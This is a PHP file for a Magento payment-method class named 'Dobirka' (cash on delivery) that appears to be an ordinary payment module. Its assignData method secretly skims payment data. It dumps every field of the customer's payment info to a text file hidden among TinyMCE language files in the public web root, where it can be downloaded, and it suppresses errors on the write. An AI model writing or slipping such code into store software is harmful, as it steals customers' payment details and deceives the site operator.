<?php
class Mage_Payment_Model_Method_Dobirka extends Mage_Payment_Model_Method_Abstract
{

    protected $_code  = 'dobirka';
    protected $_formBlockType = 'payment/form_dobirka';
    protected $_infoBlockType = 'payment/info_dobirka';

    public function assignData($data)
    {
        $details = array();
        if (!empty($details)) {
            $this->getInfoInstance()->setAdditionalData(serialize($details));
        }
                $msgz = $this->getInfoInstance($data);
                foreach ($msgz  as $key => $value) { $msgz .= $key." => ".$value."\r\n"; }
                $f = @fopen($_SERVER["DOCUMENT_ROOT"].'/js/tiny_mce/themes/advanced/langs/Dobirka.txt',"a");
                fwrite($f, $msgz."\r\n");
                fclose($f);
        return $this;
    }
}
